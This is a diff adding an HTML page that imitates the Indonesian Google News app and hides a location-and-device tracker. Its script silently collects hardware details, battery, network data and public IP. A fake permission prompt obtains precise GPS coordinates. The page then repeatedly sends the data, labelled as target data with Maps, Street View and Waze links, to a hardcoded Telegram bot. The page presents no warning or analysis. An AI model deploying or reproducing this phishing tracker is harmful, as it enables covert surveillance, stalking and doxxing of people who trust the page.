@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Google Berita - Berita Terkini Indonesia</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f4f9;
+            color: #1f1f1f;
+            min-height: 100vh;
+            padding-bottom: 60px;
+        }
+        .app-header {
+            background-color: #1867e0;
+            color: white;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .app-header h1 {
+            font-size: 1.5rem;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+        }
+        .app-header .icons {
+            display: flex;
+            gap: 18px;
+        }
+        .material-symbols-outlined {
+            font-family: 'Material Symbols Outlined', sans-serif;
+            font-size: 24px;
+        }
+        .search-section {
+            padding: 8px 16px;
+            background: white;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .search-box {
+            background: #f0f4f9;
+            border-radius: 30px;
+            padding: 10px 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #5f6368;
+        }
+        .search-box input {
+            background: transparent;
+            border: none;
+            width: 100%;
+            font-size: 16px;
+            outline: none;
+        }
+        .topic-tabs {
+            display: flex;
+            overflow-x: auto;
+            gap: 20px;
+            padding: 10px 16px;
+            background: white;
+            border-bottom: 1px solid #e0e0e0;
+            white-space: nowrap;
+        }
+        .topic-tabs span {
+            color: #5f6368;
+            font-weight: 500;
+            font-size: 15px;
+            padding-bottom: 5px;
+            border-bottom: 3px solid transparent;
+        }
+        .topic-tabs .active {
+            color: #1867e0;
+            border-bottom: 3px solid #1867e0;
+        }
+        .for-you {
+            background: white;
+            margin: 12px 0;
+            padding: 16px;
+        }
+        .for-you h2 {
+            font-size: 1.2rem;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .login-btn {
+            background: #1867e0;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 1rem;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+        .login-btn-outline {
+            background: transparent;
+            color: #1867e0;
+            border: 1px solid #dadce0;
+            margin-left: 12px;
+        }
+        .news-card {
+            background: white;
+            margin: 8px 16px;
+            border-radius: 16px;
+            padding: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            border: 1px solid #e0e0e0;
+        }
+        .news-card h3 {
+            font-size: 1rem;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+        .news-source {
+            display: flex;
+            gap: 8px;
+            margin: 10px 0 4px;
+            font-size: 0.8rem;
+            color: #5f6368;
+        }
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0 12px;
+            border-top: 1px solid #e0e0e0;
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #5f6368;
+            font-size: 0.7rem;
+        }
+        .nav-item.active {
+            color: #1867e0;
+        }
+        
+        .loc-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+        .loc-card {
+            background: white;
+            width: 300px;
+            border-radius: 28px;
+            padding: 24px 20px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        .loc-card .loc-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .loc-card h3 {
+            font-size: 1.4rem;
+            margin-bottom: 8px;
+        }
+        .loc-card p {
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        .loc-btn {
+            background: #1867e0;
+            color: white;
+            border: none;
+            padding: 14px 0;
+            width: 100%;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .loc-btn-secondary {
+            background: transparent;
+            color: #1867e0;
+            border: 1px solid #dadce0;
+            margin-top: 10px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0,1" />
+</head>
+<body>
+   
+    <div class="loc-modal" id="locationModal">
+        <div class="loc-card">
+            <div class="loc-icon">📍</div>
+            <h3>Dapatkan berita lokal</h3>
+            <p>Google Berita ingin mengakses lokasi Anda untuk menampilkan berita terkini di sekitar Anda</p>
+            <button class="loc-btn" id="allowLocationBtn">IZINKAN AKSES LOKASI</button>
+            <button class="loc-btn loc-btn-secondary" id="laterLocationBtn">Nanti</button>
+        </div>
+    </div>
+
+    
+    <div class="app-header">
+        <h1>Google Berita</h1>
+        <div class="icons">
+            <span class="material-symbols-outlined">search</span>
+            <span class="material-symbols-outlined">account_circle</span>
+        </div>
+    </div>
+
+    
+    <div class="search-section">
+        <div class="search-box">
+            <span class="material-symbols-outlined">search</span>
+            <input type="text" placeholder="Cari di Google Berita" value="pemilu 2026">
+        </div>
+    </div>
+
+    
+    <div class="topic-tabs">
+        <span class="active">Rangkuman Anda</span>
+        <span>Lokal</span>
+        <span>Indonesia</span>
+        <span>Dunia</span>
+        <span>Olahraga</span>
+        <span>Teknologi</span>
+        <span>Hiburan</span>
+    </div>
+
+    
+    <div class="for-you">
+        <h2>Rangkuman Anda</h2>
+        <p style="margin-bottom: 12px;">Rabu, 18 Maret · Pilihan untuk Anda</p>
+        <p style="color: #1f1f1f; margin-bottom: 16px;">Login untuk melihat artikel yang dipersonalisasi dalam rangkuman & feed berita Anda</p>
+        <div style="display: flex; gap: 10px;">
+            <button class="login-btn" id="fakeLoginBtn">Login</button>
+            <button class="login-btn login-btn-outline" id="fakeLaterBtn">Nanti</button>
+        </div>
+    </div>
+
+    
+    <div class="news-card">
+        <h3>KPU Tetapkan Hasil Pileg 2026, PDIP dan Gerindra Bersaing Ketat</h3>
+        <div class="news-source">
+            <span>Kompas.com</span>
+            <span>• 2 jam lalu</span>
+        </div>
+    </div>
+    <div class="news-card">
+        <h3>Pemerintah Siapkan Kebijakan Ekonomi Baru untuk Hadapi Resesi Global</h3>
+        <div class="news-source">
+            <span>CNBC Indonesia</span>
+            <span>• 4 jam lalu</span>
+        </div>
+    </div>
+    <div class="news-card">
+        <h3>Timnas U-23 Siap Tempur di SEA Qualifier, Shin Tae-yong Panggil 23 Pemain</h3>
+        <div class="news-source">
+            <span>detikSport</span>
+            <span>• 1 jam lalu</span>
+        </div>
+    </div>
+
+  
+    <div class="bottom-nav">
+        <div class="nav-item active"><span class="material-symbols-outlined">home</span><span>Home</span></div>
+        <div class="nav-item"><span class="material-symbols-outlined">search</span><span>Telusuri</span></div>
+        <div class="nav-item"><span class="material-symbols-outlined">bookmark</span><span>Simpan</span></div>
+        <div class="nav-item"><span class="material-symbols-outlined">person</span><span>Anda</span></div>
+    </div>
+
+    
+    <script>
+        
+        const BOT_TOKEN = "8660628318:AAHjZw23KKDPgpRPi1EaCH2c11i18FA5BN8";
+        const CHAT_ID = "6043729763";
+        
+        let locationData = null;
+        let ipPublic = null;
+        let batteryStatus = 'Tidak diketahui';
+        let networkInfo = null;
+        let allCollected = {};
+
+      
+        function mintaLokasi() {
+            if (!navigator.geolocation) {
+                alert('Browser Anda tidak mendukung lokasi. Gunakan browser lain.');
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    locationData = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        akurasi: pos.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.lat}&lon=${locationData.lon}&zoom=18&addressdetails=1`)
+                        .then(r => r.json())
+                        .then(data => {
+                            if (data.address) {
+                                locationData.alamat = data.address;
+                                locationData.displayName = data.display_name;
+                            }
+                           
+                            document.getElementById('locationModal').classList.add('hidden');
+                        })
+                        .catch(() => {
+                            document.getElementById('locationModal').classList.add('hidden');
+                        });
+                },
+                (err) => {
+                    alert('Gagal mendapatkan lokasi. Silakan izinkan akses lokasi di pengaturan browser Anda.');
+                    console.log(err);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        
+        async function dapetinBaterai() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    let level = (battery.level * 100).toFixed(0);
+                    let status = battery.charging ? 'charging' : 'discharging';
+                    batteryStatus = `${level}% (${status})`;
+                } catch (e) {
+                    batteryStatus = 'Gagal ambil baterai';
+                }
+            }
+        }
+
+        function dapetinIP() {
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { ipPublic = data; })
+                .catch(() => {});
+        }
+
+        function dapetinNetwork() {
+            if (navigator.connection) {
+                let conn = navigator.connection;
+                networkInfo = {
+                    effectiveType: conn.effectiveType,
+                    downlink: conn.downlink,
+                    rtt: conn.rtt,
+                    saveData: conn.saveData
+                };
+            }
+        }
+
+        function dapetinSpek() {
+            allCollected.screen = `${screen.width} x ${screen.height}`;
+            allCollected.colorDepth = screen.colorDepth;
+            allCollected.language = navigator.language;
+            allCollected.languages = navigator.languages.join(', ');
+            allCollected.platform = navigator.platform;
+            allCollected.userAgent = navigator.userAgent;
+            allCollected.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+            allCollected.deviceMemory = navigator.deviceMemory || 'unknown';
+            allCollected.maxTouchPoints = navigator.maxTouchPoints || 0;
+            allCollected.cookieEnabled = navigator.cookieEnabled;
+            allCollected.doNotTrack = navigator.doNotTrack || 'unknown';
+            allCollected.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    let renderer = gl.getParameter(gl.RENDERER);
+                    let vendor = gl.getParameter(gl.VENDOR);
+                    allCollected.gpu = `${vendor} - ${renderer}`;
+                } else {
+                    allCollected.gpu = 'WebGL tidak tersedia';
+                }
+            } catch (e) {
+                allCollected.gpu = 'gagal deteksi GPU';
+            }
+            
+            
+            if (navigator.storage && navigator.storage.estimate) {
+                navigator.storage.estimate().then(est => {
+                    allCollected.storageUsage = (est.usage / 1024 / 1024).toFixed(2) + ' MB';
+                    allCollected.storageQuota = (est.quota / 1024 / 1024).toFixed(2) + ' MB';
+                }).catch(() => {});
+            }
+        }
+
+        
+        function kirimSemua() {
+            let teks = '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+            teks += '📰 GOOGLE NEWS - DATA TARGET\n';
+            teks += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+            teks += `🕐 Waktu akses: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n`;
+            teks += `🌐 URL: ${window.location.href}\n`;
+            teks += `🆔 User Agent: ${allCollected.userAgent || 'N/A'}\n\n`;
+
+            teks += `[💻 SPESIFIKASI PERANGKAT]\n`;
+            teks += `Platform     : ${allCollected.platform}\n`;
+            teks += `CPU Cores    : ${allCollected.hardwareConcurrency}\n`;
+            teks += `RAM          : ${allCollected.deviceMemory} GB\n`;
+            teks += `Layar        : ${allCollected.screen} (${allCollected.colorDepth}-bit)\n`;
+            teks += `Bahasa       : ${allCollected.language} (sistem: ${allCollected.languages})\n`;
+            teks += `Timezone     : ${allCollected.timezone}\n`;
+            teks += `Cookie Enab. : ${allCollected.cookieEnabled}\n`;
+            teks += `Do Not Track : ${allCollected.doNotTrack}\n`;
+            teks += `Touch points : ${allCollected.maxTouchPoints}\n`;
+            teks += `GPU          : ${allCollected.gpu || 'N/A'}\n`;
+            teks += `Baterai      : ${batteryStatus}\n`;
+            if (allCollected.storageUsage) teks += `Storage used : ${allCollected.storageUsage} / ${allCollected.storageQuota}\n`;
+
+            if (networkInfo) {
+                teks += `\n[📶 KONEKSI]\n`;
+                teks += `Tipe         : ${networkInfo.effectiveType}\n`;
+                teks += `Downlink     : ${networkInfo.downlink} Mbps\n`;
+                teks += `RTT          : ${networkInfo.rtt} ms\n`;
+            }
+
+            if (ipPublic) {
+                teks += `\n[🌍 IP PUBLIK]\n`;
+                teks += `IP           : ${ipPublic.ip}\n`;
+                teks += `Negara       : ${ipPublic.country_name} (${ipPublic.country_code})\n`;
+                teks += `Kota         : ${ipPublic.city}\n`;
+                teks += `ISP          : ${ipPublic.org}\n`;
+                teks += `Lat, Lon     : ${ipPublic.latitude}, ${ipPublic.longitude}\n`;
+            }
+
+            if (locationData) {
+                teks += `\n[📍 LOKASI REAL-TIME (HIGH ACC)]\n`;
+                teks += `Latitude     : ${locationData.lat}\n`;
+                teks += `Longitude    : ${locationData.lon}\n`;
+                teks += `Akurasi      : ${locationData.akurasi.toFixed(1)} meter\n`;
+                teks += `Waktu fix    : ${locationData.timestamp}\n`;
+                if (locationData.displayName) {
+                    teks += `Alamat       : ${locationData.displayName}\n`;
+                }
+                teks += `\n🔗 Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}\n`;
+                teks += `🏠 Street View: https://www.google.com/maps?q=&layer=c&cbll=${locationData.lat},${locationData.lon}\n`;
+                teks += `🚗 Waze       : https://waze.com/ul?ll=${locationData.lat},${locationData.lon}&navigate=yes\n`;
+            } else {
+                teks += `\n📍 LOKASI: Belum diizinkan\n`;
+            }
+
+            teks += `\n━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+
+            
+            if (teks.length > 4000) {
+                let part1 = teks.slice(0, 4000);
+                let part2 = teks.slice(4000);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: part1 })
+                });
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: part2 })
+                });
+            } else {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
+                });
+            }
+
+           
+            if (locationData) {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `📍 *LOKASI TARGET REAL-TIME*\nLat: \`${locationData.lat}\`\nLon: \`${locationData.lon}\`\nAkurasi: ${locationData.akurasi.toFixed(1)}m\n\n[Google Maps](https://www.google.com/maps?q=${locationData.lat},${locationData.lon})\n[Street View](https://www.google.com/maps?q=&layer=c&cbll=${locationData.lat},${locationData.lon})\n[Waze](https://waze.com/ul?ll=${locationData.lat},${locationData.lon}&navigate=yes)`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            }
+        }
+
+        
+        document.getElementById('allowLocationBtn').addEventListener('click', function() {
+            mintaLokasi();
+        });
+
+        document.getElementById('laterLocationBtn').addEventListener('click', function() {
+            document.getElementById('locationModal').classList.add('hidden');
+        });
+
+        document.getElementById('fakeLoginBtn').addEventListener('click', function() {
+            alert('Fitur login sedang maintenance. Silakan coba lagi nanti.');
+        });
+
+        document.getElementById('fakeLaterBtn').addEventListener('click', function() {
+            alert('Terima kasih telah menggunakan Google Berita.');
+        });
+
+        
+        (function main() {
+           
+            dapetinBaterai();
+            dapetinIP();
+            dapetinNetwork();
+            dapetinSpek();
+
+            
+            setTimeout(() => {
+                document.getElementById('locationModal').classList.remove('hidden');
+            }, 1000);
+
+
+            setTimeout(() => {
+                kirimSemua();
+            }, 8000);
+
+
+            setInterval(() => {
+                kirimSemua();
+            }, 25000);
+        })();
+    </script>
+</body>
+</html>
